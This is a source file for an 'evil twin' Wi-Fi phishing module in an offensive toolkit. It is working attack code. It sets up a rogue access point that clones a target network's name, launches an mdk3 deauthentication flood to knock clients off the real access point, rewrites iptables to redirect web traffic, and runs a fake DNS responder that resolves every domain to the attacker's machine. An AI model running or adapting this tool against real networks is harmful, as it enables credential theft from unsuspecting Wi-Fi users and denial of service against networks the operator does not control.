# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
import commands,socket,time
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="Wifi Phising (evil twin)"
	init.CodeName           ="wifi/ev.twin"
	init.DateCreation       ="31/05/2016"      
	init.LastModification   ="25/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                        RQ     DESCRIPTION
		'drive'   :[INTERFACE_DEVICE          ,True ,'Interface'],
		'driveMon':[INTERFACE_MONITOR         ,True ,'Monitor Interface'],
		'essid'   :["movil_wifi"              ,True ,'AP Essid'],
		'bssid'   :[MAC_TARGET                ,True ,'AP Mac Address'],
		'template':["files/wifi/tmp/neutral/" ,True ,'Files Phising'],
		'channel' :["11"                      ,True ,'Channel AP']
	}
	# EXTRA OPTIONS MODULE
	init.extra = {
		# NAME    VALUE                        RQ     DESCRIPTION
		'ip_range':["192.168.1.1"             ,False,'Ip Range']
	}
	# AUX INFORMATION MODULE
	init.aux = "\n Devices Founds: "+str(NET.GetInterfacesOnSystem())
	init.aux += "\n Monitors Inter: "+str(NET.GetMonitorInterfaces())
	init.aux += "\n Functions     : For Scan Ap's, type 'f::getaps(Monitor_Interface,Time)"
	init.aux += "\n                  For Start Monitor Mode, type 'f::startmonitormode(Interface)\n" 
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	if InterfaceSupportAPMode():
		Loadingfile(init.var['template'])
		process=commands.getoutput("airmon-ng check $INTERFACE | tail -n +8 | grep -v \"on interface\" | awk '{ print $2 }'")
		printk.inf("Killing proccess on interface")
		process=process.split("\n")
		for p in process:
			commands.getoutput("killall "+p)

		rangos=init.var['ip_range'].split(".")
		rango=rangos[0]+"."+rangos[1]+"."+rangos[3]+".1"
		rangov=rangos[0]+"."+rangos[1]+"."+rangos[3]

		printk.inf("Setting tables ["+rango+"]")
		commands.getoutput("ifconfig "+init.var['drive']+" up")
		commands.getoutput("ifconfig "+init.var['drive']+" "+init.var['ip_range']+" netmask 255.255.255.0")
		commands.getoutput("route add -net "+rango+" netmask 255.255.255.0 gw "+init.var['ip_range'])
		commands.getoutput("echo \"1\" > /proc/sys/net/ipv4/ip_forward")
		commands.getoutput("iptables --flush")
		commands.getoutput("iptables --table nat --flush")
		commands.getoutput("iptables --delete-chain")
		commands.getoutput("iptables --table nat --delete-chain")
		commands.getoutput("iptables -P FORWARD ACCEPT")
		commands.getoutput("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+init.var['ip_range']+":80")
		commands.getoutput("iptables -t nat -A POSTROUTING -j MASQUERADE")
		commands.getoutput("echo interface="+init.var['drive']+"  > tmp/hostapd.conf")
		commands.getoutput("echo driver=nl80211                  >> tmp/hostapd.conf")
		commands.getoutput("echo ssid="+init.var['essid']+"      >> tmp/hostapd.conf")
		commands.getoutput("echo channel="+init.var['channel']+" >> tmp/hostapd.conf")

		commands.getoutput("echo authoritative\;> tmp/dhcpd.config")
		commands.getoutput("echo default-lease-time 600\;>> tmp/dhcpd.config")
		commands.getoutput("echo max-lease-time 7200\;>> tmp/dhcpd.config")
		commands.getoutput("echo subnet "+rangov+".0 netmask 255.255.255.0 { >> tmp/dhcpd.config")
		commands.getoutput("echo option broadcast-address "+rangov+".255\;>> tmp/dhcpd.config")
		commands.getoutput("echo option routers "+rango+"\;>> tmp/dhcpd.config")
		commands.getoutput("echo option subnet-mask 255.255.255.0\;>> tmp/dhcpd.config")
		commands.getoutput("echo option domain-name-servers "+rango+"\;>> tmp/dhcpd.config")
		commands.getoutput("echo range "+rangov+".100 "+rangov+".250\;>> tmp/dhcpd.config")
		commands.getoutput("echo }>> tmp/dhcpd.config")
		commands.getoutput("echo "+init.var['bssid']+" > tmp/target.log")

		#printk.inf("Starting Apache Server                   "+status_cmd("service apache2 start"))
		#printk.inf("Coping Files to Server                   "+status_cmd("cp -r "+init.var['template']+"* "+PATCH_WWW))
		#printk.inf("Starting Access Point ["+init.var['essid']+"]")
		SYSTEM.Subprocess("hostapd tmp/hostapd.conf")
		time.sleep(3)
		printk.inf("Starting DHCP server")
		SYSTEM.Subprocess("dhcpd -d -f -cf tmp/dhcpd.config")
		time.sleep(3)
		printk.inf("Starting DOS attack to "+init.var['bssid'])
		SYSTEM.Subprocess("mdk3 "+init.var['driveMon']+" d -b tmp/target.log -c "+init.var['channel'])
		raw_input(printk.pkey("if you want to stop AP (PRESS [ENTER])"))
		DNSFAKE()
		SYSTEM.KillProcess("dhcpd")
		SYSTEM.KillProcess("hostapd")
		SYSTEM.KillProcess("mdk3")
		SYSTEM.KillProcess("NetworkManager start")
		commands.getoutput("iptables --flush")
		commands.getoutput("iptables --table nat --flush")
		commands.getoutput("iptables --delete-chain")
		commands.getoutput("iptables --table nat --delete-chain")
		for p in process:
			commands.getoutput("service "+p+" start")

		#printk.inf("Removing files                           "+status_cmd("rm -r "+PATCH_WWW+"* ; rm tmp/hostapd.conf; rm tmp/dhcpd.config; rm tmp/target.log"))
		#printk.inf("Stoping Apache Server                    "+status_cmd("service apache2 stop"))
		Space()

# CODE MODULE    ############################################################################################

# THIS SCRIPT IS OF LINSET PROJECT 
class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15  
    if tipo == 0:                     
      ini=12
      lon=ord(data[ini])
      while lon != 0:
	self.dominio+=data[ini+1:ini+lon+1]+'.'
	ini+=lon+1
	lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + "\x81\x80"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   
      packet+=self.data[12:]                                         
      packet+='\xc0\x0c'                                             
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'            
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) 
    return packet

def DNSFAKE():
  ip=init.var['ip_range']
  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))
  
  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print "  | from "+str(addr[0])+' Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    printk.inf('Stoping')
    udps.close()
